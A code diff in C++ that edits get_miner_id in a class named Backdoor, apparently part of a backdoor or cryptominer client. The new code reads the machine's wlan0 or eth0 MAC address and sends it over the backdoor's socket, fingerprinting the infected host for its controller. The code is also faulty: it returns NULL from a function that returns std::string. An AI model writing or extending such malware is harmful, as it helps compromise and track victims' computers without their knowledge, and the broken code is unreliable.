@@ -44,16 +44,25 @@ std::string Backdoor::get_miner_id(){
     
     }else{
         
-        std::string wlan0;
-        FILE * f; 
+        char wlan0[20], eth0[20];
+        FILE * f, *g; 
         f = fopen("/sys/class/net/wlan0/address", "r");
         if(f != NULL){
-            fscanf(f, "%s");
+            fscanf(f, "%s", wlan0);
+            fclose(f);
+            c->send_message(this->sock, wlan0);
+            return NULL;
+
+        }else{
+            g = fopen("/sys/class/net/eth0/address", "r");
+            if(g != NULL){
+                fscanf(g, "%s", eth0);
+                fclose(g);
+                c->send_message(this->sock, eth0);
+                return NULL;
+            }
         }
-
     }
-    
-
 }
 
 
